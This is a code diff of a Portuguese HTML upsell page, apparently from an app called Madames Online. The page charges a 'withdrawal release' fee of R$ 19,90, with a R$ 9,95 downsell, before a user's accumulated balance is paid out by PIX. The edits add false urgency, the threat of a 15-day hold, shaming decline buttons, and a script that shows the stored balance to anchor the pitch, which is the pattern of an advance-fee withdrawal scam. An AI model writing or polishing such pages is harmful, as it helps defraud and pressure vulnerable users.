@@ -4,8 +4,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Liberar Saque - Madames Online</title>
-  <meta name="description" content="Pague a taxa única de liberação e receba seu saldo agora.">
+  <title>Liberação de Saque - Madames Online</title>
+  <meta name="description" content="Confirme a Liberação de Saque e receba seu saldo agora.">
   <meta name="robots" content="noindex, nofollow">
   <link rel="icon" href="/favicon.ico">
   <link rel="stylesheet" href="/css/upsell.css">
@@ -17,64 +17,46 @@
 </head>
 
 <body>
-  <div class="wrap">
-    <img class="logo" src="/app/images/logo-madames.png" alt="Madames Online">
+  <header class="app-header">
+    <img class="app-header-logo" src="/app/images/logo-madames.png" alt="">
+    <span class="app-header-name">Madames Online</span>
+  </header>
 
+  <div class="wrap">
     <!-- OFERTA PRINCIPAL -->
     <div id="main-offer">
-      <p class="selection-line">Seu saque já passou pela verificação inicial. Você está na etapa de liberação do saldo.</p>
+      <p class="selection-line">Seu saque já passou pela verificação inicial. Agora está na etapa de liberação do saldo.</p>
 
-      <h1>Libere seu <span>SAQUE</span> agora</h1>
-      <p class="subtitle">Pague a taxa única de liberação e receba seu saldo sem esperar.</p>
+      <h1>Seu saldo está <span>pronto pra sair</span></h1>
 
-      <ul class="benefits">
-        <li><span>Liberação imediata do seu saldo acumulado.</span></li>
-        <li><span>Prioridade na fila de pagamentos PIX, à frente de quem não liberou.</span></li>
-        <li><span>Processo verificado e seguro.</span></li>
-        <li><span>Confirmação enviada assim que o pagamento é processado.</span></li>
-        <li><span>Saque liberado permanentemente pras próximas vezes.</span></li>
-      </ul>
-
-      <div class="reason-box">
-        <div class="reason-title">Por que existe essa taxa?</div>
-        <p>Toda solicitação de saque passa por uma <strong>verificação antifraude</strong> antes de liberar o valor via PIX. Essa taxa cobre o custo dessa verificação e garante o <strong>processamento imediato</strong>. Sem ela, seu pedido entra na fila manual, que pode levar até 15 dias úteis.</p>
+      <div class="balance-callout">
+        <div class="balance-label">Saldo disponível pra saque</div>
+        <div class="balance-value" id="balance-value">R$ 0,00</div>
       </div>
 
-      <div class="guarantee-badge">Você recebe essa taxa de volta junto com o seu saldo, no mesmo PIX</div>
+      <p class="notice-text">Nossa equipe está analisando seu saque agora, validando sua chave PIX e os dados da transferência antes de liberar o valor. Essa verificação manual é o que garante a segurança do PIX, mas também é o que faz o processo demorar.</p>
 
-      <div class="price-card">
-        <div class="price-label">Taxa única de liberação</div>
-        <div class="price-old">Taxa integral: R$ 29,90</div>
-        <div class="price">R$ 19,90</div>
-        <div class="price-note">Você recebe esse valor de volta junto com o seu saldo</div>
-      </div>
+      <p class="notice-text">A <strong>Liberação de Saque</strong> pula essa fila de análise e coloca seu saldo na sua chave PIX na hora. Sem ela, seu pedido continua na fila manual, que pode levar até 15 dias úteis, com seu dinheiro parado nesse período.</p>
 
-      <a href="#" class="cta" id="accept-main">LIBERAR MEU SAQUE</a>
-      <button type="button" class="decline-link" id="decline-main">Não, obrigado, quero continuar sem liberar</button>
-      <p class="trust">Sem essa liberação, o saldo permanece retido na sua conta.</p>
-      <p class="scarcity-note">Essa taxa reduzida só existe nesta tela. Se você sair, ela não aparece de novo.</p>
+      <p class="closing-pitch">Confirme agora e seu saldo cai na hora, direto na sua chave PIX. Essa liberação só fica disponível nesta tela, se você sair, seu saque volta pra fila normal.</p>
+
+      <p class="price-line">Liberação de Saque: <strong class="price-line-value">R$ 19,90</strong></p>
+
+      <a href="#" class="cta" id="accept-main">LIBERAR MEU SALDO AGORA</a>
+      <button type="button" class="decline-link" id="decline-main">Não, prefiro deixar meu saldo bloqueado</button>
     </div>
 
     <!-- DOWNSELL -->
     <div id="downsell-offer" hidden>
       <div class="downsell-ribbon">Espera! Preparamos uma condição especial só pra você</div>
       <h1>Última chance: <span>50% OFF</span> na liberação</h1>
-      <p class="subtitle">Só agora, a taxa de liberação sai pela metade do preço.</p>
 
-      <p class="downsell-reason"><strong>Por que esse desconto?</strong> Como você já passou pela verificação inicial, conseguimos reduzir o custo repassado nessa etapa.</p>
+      <p class="notice-text">Como você já passou pela verificação inicial, conseguimos reduzir o custo da Liberação de Saque nessa etapa. Você ainda pula a fila inteira e recebe o PIX na hora.</p>
 
-      <div class="guarantee-badge">Você recebe essa taxa de volta junto com o seu saldo, no mesmo PIX</div>
-
-      <div class="price-card">
-        <span class="discount-badge">50% OFF</span>
-        <div class="price-label">Taxa única de liberação</div>
-        <div class="price-old">De R$ 19,90</div>
-        <div class="price">R$ 9,95</div>
-        <div class="price-note">Essa condição não volta a aparecer</div>
-      </div>
+      <p class="price-line">Liberação de Saque: <span class="price-line-old">R$ 19,90</span> <strong class="price-line-value">R$ 9,95</strong></p>
 
       <a href="#" class="cta" id="accept-downsell">SIM, QUERO POR R$ 9,95</a>
-      <button type="button" class="decline-link" id="decline-downsell">Não, quero continuar sem liberar</button>
+      <button type="button" class="decline-link" id="decline-downsell">Não, prefiro perder esse valor e deixar meu saldo travado</button>
     </div>
 
     <div class="footer">© <span id="year"></span> Madames Online. Todos os direitos reservados.</div>
@@ -85,7 +67,24 @@
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
   <script src="/admin/js/firebase-config.js"></script>
   <script src="/admin/js/tracking.js"></script>
-  <script>document.getElementById('year').textContent = new Date().getFullYear();</script>
+  <script>
+    document.getElementById('year').textContent = new Date().getFullYear();
+
+    // Puxa o saldo real acumulado pelo usuário (mesmo valor mostrado no /discover
+    // e no /chat) pra ancorar a copy no dinheiro que ele já ganhou, em vez de
+    // falar de forma genérica. Se não tiver saldo registrado (ex: veio direto de
+    // um link sem passar pelo app), esconde o bloco em vez de mostrar R$0,00.
+    (function () {
+      var raw = parseFloat(localStorage.getItem('userBalance') || '0');
+      var el = document.getElementById('balance-value');
+      var callout = el ? el.closest('.balance-callout') : null;
+      if (raw > 0 && el) {
+        el.textContent = 'R$ ' + raw.toFixed(2).replace('.', ',');
+      } else if (callout) {
+        callout.hidden = true;
+      }
+    })();
+  </script>
 
   <!-- Configuração desta página de upsell -->
   <script>
